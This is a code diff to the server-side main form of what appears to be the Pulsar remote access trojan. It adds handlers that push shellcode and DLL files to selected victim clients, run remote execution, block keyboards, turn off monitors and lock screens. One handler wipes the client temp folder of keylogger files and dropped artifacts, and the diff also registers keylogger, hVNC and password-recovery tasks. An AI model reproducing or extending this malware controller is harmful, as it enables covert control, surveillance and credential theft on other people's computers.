@@ -147,7 +147,7 @@ namespace Pulsar.Server.Forms
 
             InitializeSearch();
             InitializeNotificationTracking();
-            
+
             // Initialize Plugin System
             InitializePlugins();
         }
@@ -434,20 +434,20 @@ namespace Pulsar.Server.Forms
 
                 if (ListenServer != null)
                     ListenServer.Disconnect();
-                    
+
                 UnregisterMessageHandler();
 
                 _clientPluginCatalog?.Dispose();
-                
+
                 if (_previewImageHandler != null)
                 {
                     MessageHandler.Unregister(_previewImageHandler);
                     _previewImageHandler.Dispose();
                 }
-                
+
                 if (_discordRpc != null)
                     _discordRpc.Enabled = false;  // Disable Discord RPC on close
-                    
+
                 if (notifyIcon != null)
                 {
                     notifyIcon.Visible = false;
@@ -736,7 +736,7 @@ namespace Pulsar.Server.Forms
                     }
                 }
                 UpdateConnectedClientsCount();
-                
+
                 // Load plugins for the new client
                 LoadPluginsForClient(client);
             }
@@ -2668,36 +2668,12 @@ namespace Pulsar.Server.Forms
 
         private void installVirtualMonitorToolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            foreach (Client c in GetSelectedClients())
-            {
-                //check if client is admin
-                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
-                if (isClientAdmin)
-                {
-                    c.Send(new DoInstallVirtualMonitor());
-                }
-                else
-                {
-                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                }
-            }
+
         }
 
         private void uninstallVirtualMonitorToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            foreach (Client c in GetSelectedClients())
-            {
-                //check if client is admin
-                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
-                if (isClientAdmin)
-                {
-                    c.Send(new DoUninstallVirtualMonitor());
-                }
-                else
-                {
-                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                }
-            }
+
         }
 
         #endregion "Monitoring"
@@ -4062,16 +4038,16 @@ namespace Pulsar.Server.Forms
             RegisterDefaultAutoTask(registryEditorToolStripMenuItem, registryEditorToolStripMenuItem_Click);
 
             RegisterAutoTaskBehavior(new AutoTaskBehavior(
-                localFileToolStripMenuItem.Name,
+                remoteExecuteToolStripMenuItem.Name,
                 "Remote Execute (Local File)",
-                localFileToolStripMenuItem,
+                remoteExecuteToolStripMenuItem,
                 CreateRemoteExecuteLocalAutoTask,
                 (frm, client, task) => frm.ExecuteRemoteExecuteLocalAutoTask(client, task)));
 
             RegisterAutoTaskBehavior(new AutoTaskBehavior(
-                webFileToolStripMenuItem.Name,
+                remoteExecuteToolStripMenuItem.Name,
                 "Remote Execute (Web File)",
-                webFileToolStripMenuItem,
+                remoteExecuteToolStripMenuItem,
                 CreateRemoteExecuteWebAutoTask,
                 (frm, client, task) => frm.ExecuteRemoteExecuteWebAutoTask(client, task)));
 
@@ -4087,8 +4063,8 @@ namespace Pulsar.Server.Forms
             RegisterDefaultAutoTask(hVNCToolStripMenuItem, hVNCToolStripMenuItem_Click);
             RegisterDefaultAutoTask(keyloggerToolStripMenuItem, keyloggerToolStripMenuItem_Click);
             RegisterDefaultAutoTask(passwordRecoveryToolStripMenuItem, passwordRecoveryToolStripMenuItem_Click);
-            RegisterDefaultAutoTask(installVirtualMonitorToolStripMenuItem1, installVirtualMonitorToolStripMenuItem1_Click);
-            RegisterDefaultAutoTask(uninstallVirtualMonitorToolStripMenuItem, uninstallVirtualMonitorToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(installToolStripMenuItem, installToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(uninstallToolStripMenuItem, uninstallToolStripMenuItem1_Click);
 
             // User support
             RegisterDefaultAutoTask(remoteChatToolStripMenuItem, remoteChatToolStripMenuItem_Click);
@@ -5005,21 +4981,21 @@ namespace Pulsar.Server.Forms
                 _serverContext = new ServerContext(this);
                 _pluginManager = new PluginManager(_serverContext);
                 _pluginManager.PluginsChanged += OnPluginsChanged;
-                
+
                 var pluginsDir = Path.Combine(Application.StartupPath, "Plugins");
                 if (!Directory.Exists(pluginsDir))
                 {
                     Directory.CreateDirectory(pluginsDir);
                 }
-                
+
                 _pluginManager.LoadFrom(pluginsDir);
 
                 _clientPluginCatalog = new ClientPluginCatalog(_serverContext);
                 _clientPluginCatalog.PluginsChanged += OnClientPluginsChanged;
                 _clientPluginCatalog.LoadFrom(pluginsDir);
-                
+
                 ApplyUIExtensions();
-                
+
                 UpdatePluginStatus();
             }
             catch (Exception ex)
@@ -5035,7 +5011,7 @@ namespace Pulsar.Server.Forms
                 Invoke(new Action<object, EventArgs>(OnPluginsChanged), sender, e);
                 return;
             }
-            
+
             ApplyUIExtensions();
             UpdatePluginStatus();
         }
@@ -5086,7 +5062,7 @@ namespace Pulsar.Server.Forms
                 SendClientOnlyPlugins(client);
             }
         }
-        
+
         private void ApplyUIExtensions()
         {
             try
@@ -5105,7 +5081,7 @@ namespace Pulsar.Server.Forms
                         }
                     }
                 }
-                
+
                 var toolStrip = FindControl<ToolStrip>(this);
                 if (toolStrip != null)
                 {
@@ -5118,7 +5094,7 @@ namespace Pulsar.Server.Forms
                         }
                     }
                 }
-                
+
                 var menuStrip = FindControl<MenuStrip>(this);
                 if (menuStrip != null)
                 {
@@ -5139,19 +5115,19 @@ namespace Pulsar.Server.Forms
                 System.Diagnostics.Debug.WriteLine($"Error applying UI extensions: {ex.Message}");
             }
         }
-        
+
         private T FindControl<T>(Control parent) where T : Control
         {
             if (parent is T target)
                 return target;
-                
+
             foreach (Control child in parent.Controls)
             {
                 var found = FindControl<T>(child);
                 if (found != null)
                     return found;
             }
-            
+
             return null;
         }
 
@@ -5269,12 +5245,12 @@ namespace Pulsar.Server.Forms
                 // Get the plugin's client module bytes
                 var pluginType = serverPlugin.GetType();
                 var asm = pluginType.Assembly;
-                
+
                 // Look for embedded client module
                 var clientModuleName = $"{pluginType.Name}.ClientModule.dll";
                 var resourceName = asm.GetManifestResourceNames()
                     .FirstOrDefault(n => n.EndsWith(clientModuleName, StringComparison.OrdinalIgnoreCase));
-                
+
                 if (resourceName != null)
                 {
                     using (var stream = asm.GetManifestResourceStream(resourceName))
@@ -5282,10 +5258,10 @@ namespace Pulsar.Server.Forms
                     {
                         stream.CopyTo(ms);
                         var clientBytes = ms.ToArray();
-                        
+
                         // Send the plugin to the client
                         var pluginId = $"{pluginType.Name}_{Guid.NewGuid():N}";
-                        PushSender.LoadUniversalPlugin(client, pluginId, clientBytes, null, 
+                        PushSender.LoadUniversalPlugin(client, pluginId, clientBytes, null,
                             $"{pluginType.Name}.ClientModule", "Initialize");
                     }
                 }
@@ -5294,12 +5270,12 @@ namespace Pulsar.Server.Forms
                     // Try to load from file system
                     var pluginsDir = Path.Combine(Application.StartupPath, "Plugins");
                     var clientModulePath = Path.Combine(pluginsDir, $"{pluginType.Name}.ClientModule.dll");
-                    
+
                     if (File.Exists(clientModulePath))
                     {
                         var clientBytes = File.ReadAllBytes(clientModulePath);
                         var pluginId = $"{pluginType.Name}_{Guid.NewGuid():N}";
-                        PushSender.LoadUniversalPlugin(client, pluginId, clientBytes, null, 
+                        PushSender.LoadUniversalPlugin(client, pluginId, clientBytes, null,
                             $"{pluginType.Name}.ClientModule", "Initialize");
                     }
                 }
@@ -5336,6 +5312,178 @@ namespace Pulsar.Server.Forms
         }
 
         #endregion Plugin System
+
+        private void startToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                // This would block the keyboard
+                c.Send(new DoBlockKeyboardInput(true));
+            }
+        }
+
+        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                // This would block the keyboard
+                c.Send(new DoBlockKeyboardInput(false));
+            }
+        }
+
+        private void openToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoCDTray(true));
+            }
+        }
+
+        private void closeToolStripMenuItem_Click_1(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoCDTray(false));
+            }
+        }
+
+        private void allOffToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoMonitorsOff(false));
+            }
+        }
+
+        private void allOnToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoMonitorsOff(true));
+            }
+        }
+
+        private void openClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmFileManager.OpenDownloadFolderFor(c);
+            }
+
+        }
+
+        private void shellcodeRunnerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog ofd = new OpenFileDialog())
+            {
+                ofd.Multiselect = false;
+                ofd.Filter = "Binary Files (*.bin)|*.bin|All Files (*.*)|*.*";
+
+                if (ofd.ShowDialog() != DialogResult.OK)
+                    return;
+
+                string filePath = ofd.FileName;
+                string fileName = Path.GetFileName(filePath);
+                byte[] fileData = File.ReadAllBytes(filePath);
+
+                foreach (Client c in GetSelectedClients())
+                {
+                    c.Send(new DoSendBinFile(fileName, fileData));
+                }
+            }
+
+        }
+
+        private void injectDLLToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog ofd = new OpenFileDialog())
+            {
+                ofd.Multiselect = false;
+                ofd.Filter = "DLL Files (*.dll)|*.dll|All Files (*.*)|*.*";
+
+                if (ofd.ShowDialog() != DialogResult.OK)
+                    return;
+
+                string filePath = ofd.FileName;
+                string fileName = Path.GetFileName(filePath);
+                byte[] fileData = File.ReadAllBytes(filePath);
+
+                foreach (Client c in GetSelectedClients())
+                {
+                    c.Send(new DoSendBinFile(fileName, fileData));
+                }
+            }
+
+        }
+
+        private void installToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                //check if client is admin
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+                if (isClientAdmin)
+                {
+                    c.Send(new DoInstallVirtualMonitor());
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void uninstallToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                //check if client is admin
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+                if (isClientAdmin)
+                {
+                    c.Send(new DoUninstallVirtualMonitor());
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void remoteExecuteToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            Client[] clients = GetSelectedClients();
+            if (clients.Length > 0)
+            {
+                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
+                frmRe.Show();
+            }
+        }
+
+        private void lockScreenToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoShutdownAction { Action = ShutdownAction.Lockscreen });
+            }
+        }
+
+        private void deleteTempDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            DialogResult result = MessageBox.Show(
+                "This will delete everything inside the Client's temp folder. This includes keylogger files, dropped temp files, DLLs, and other artifacts written to disk.\n\nContinue?",
+                "Confirm Cleanup",
+                MessageBoxButtons.YesNo,
+                MessageBoxIcon.Warning);
+
+            if (result != DialogResult.Yes)
+                return;
+
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoClearTempDirectory());
+            }
+        }
     }
 
     public class NotificationEntry
@@ -5371,12 +5519,12 @@ namespace Pulsar.Server.Forms
         private readonly FrmMain _form;
         private readonly List<ToolStripMenuItem> _pluginMenuItems = new List<ToolStripMenuItem>();
         private readonly object _pluginTag = new object();
-        
+
         public ServerContext(FrmMain form) { _form = form; }
         public Form MainForm => _form;
         public PulsarServer Server => _form.ListenServer;
         public void Log(string message) { _form.EventLog(message, "info"); }
-        
+
         public void ClearPluginMenuItems()
         {
             if (_form == null || _form.IsDisposed) return;
